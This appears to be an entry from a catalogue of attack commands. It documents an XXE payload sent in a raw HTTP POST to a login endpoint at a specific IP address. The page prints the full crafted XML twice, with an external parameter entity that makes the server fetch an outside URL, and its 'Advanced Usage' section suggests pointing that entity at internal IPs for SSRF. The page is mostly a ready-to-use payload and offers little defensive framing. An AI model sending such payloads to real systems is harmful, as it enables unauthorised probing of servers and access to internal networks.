---
data: >-
  POST /user/login HTTP/1.1

  Host: 144.76.105.208

  Accept: */*

  Content-type: application/xml

  Accept-Language: en

  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
  Trident/5.0)

  Connection: close

  Content-Length: 163


  <?xml version="1.0"?>

  <!DOCTYPE a [

  <!ENTITY % select SYSTEM "http://wallarm.tools/ok">

  %select;

  ]>

  <a>wlrm-scnr</a>
tags:
  - xxe
  - http
  - post
type: command
executor: bash
platforms:
  - Linux
  - Web
id: c14a3fe9-f622-496c-80ea-abebfdaf3109
created_at: '2025-12-13T09:00:27.203Z'
updated_at: '2025-12-13T09:00:27.203Z'
verified: false
validated: true
submitted: true
---
# XXE POST Request

## Command

```bash
POST /user/login HTTP/1.1
Host: 144.76.105.208
Accept: */*
Content-type: application/xml
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 163

<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
%select;
]>
<a>wlrm-scnr</a>
```

## Description

Sends a POST request with a crafted XML payload to exploit XXE, forcing the server to fetch an external entity and trigger SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Host` | Specifies the target server IP | Yes |
| `User-Agent` | Mimics a browser user agent | No |
| `Content-type` | Sets the request content type to application/xml for XML parsing | Yes |
| `ENTITY % select SYSTEM` | Defines an external entity that points to a remote URL to trigger SSRF | Yes |

## Examples

### Basic Usage

```bash
POST /user/login HTTP/1.1
Host: 144.76.105.208
Accept: */*
Content-type: application/xml
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 163

<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY % select SYSTEM "http://wallarm.tools/ok">
%select;
]>
<a>wlrm-scnr</a>
```

### Advanced Usage

Modify the entity URL for different targets, e.g., internal IPs.

## Expected Output

Server processes the XML and makes a GET request to the specified URL, verifiable in external logs.

## Related

- [[commands/ssrf-get-request]]
- [[procedures/Exploit-XXE-via-Crafted-XML-POST-Request]]
